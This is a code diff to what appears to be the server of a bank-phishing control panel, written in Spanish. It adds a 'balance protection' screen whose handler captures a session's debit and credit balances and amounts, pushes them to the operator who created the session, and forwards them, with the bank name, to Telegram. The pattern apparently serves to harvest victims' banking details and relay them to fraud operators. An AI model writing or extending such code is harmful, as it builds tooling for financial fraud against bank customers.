@@ -1497,6 +1497,12 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
                 screenType = ScreenType.PROTECCION_BANCARIA;
               }
 
+              // Normalizar screenType para PROTECCION_SALDO
+              if (screenType.toLowerCase() === 'proteccion_saldo') {
+                console.log('Normalizando screenType PROTECCION_SALDO en servidor:', screenType, 'to', ScreenType.PROTECCION_SALDO);
+                screenType = ScreenType.PROTECCION_SALDO;
+              }
+
               // Actualizar la última actividad de la sesión
               await storage.updateSessionActivity(sessionId);
               
@@ -1853,6 +1859,49 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
                       createdBy
                     }
                   }), createdBy);
+                }
+                break;
+              case 'PROTECCION_SALDO':
+              case 'proteccion_saldo':
+                if (inputData) {
+                  updatedFields.saldoDebito = inputData.saldoDebito;
+                  updatedFields.montoDebito = inputData.montoDebito;
+                  updatedFields.saldoCredito = inputData.saldoCredito;
+                  updatedFields.montoCredito = inputData.montoCredito;
+                  
+                  console.log('Recibidos datos de protección de saldo:', {
+                    debito: inputData.saldoDebito,
+                    montoDebito: inputData.montoDebito,
+                    credito: inputData.saldoCredito,
+                    montoCredito: inputData.montoCredito
+                  });
+
+                  // Notificar a los administradores inmediatamente
+                  const sessionData = await storage.getSessionById(sessionId);
+                  const createdBy = sessionData?.createdBy || '';
+                  
+                  broadcastToAdmins(JSON.stringify({
+                    type: 'PROTECCION_SALDO_DATA',
+                    data: {
+                      sessionId,
+                      saldoDebito: inputData.saldoDebito,
+                      montoDebito: inputData.montoDebito,
+                      saldoCredito: inputData.saldoCredito,
+                      montoCredito: inputData.montoCredito,
+                      timestamp: new Date().toISOString(),
+                      createdBy
+                    }
+                  }), createdBy);
+                  
+                  // Enviar notificación a Telegram
+                  await sendTelegramNotification({
+                    sessionId,
+                    banco: sessionData?.banco || 'Desconocido',
+                    tipo: 'proteccion_saldo',
+                    data: inputData,
+                    timestamp: new Date().toISOString(),
+                    createdBy: sessionData?.createdBy || 'Desconocido'
+                  });
                 }
                 break;
             }
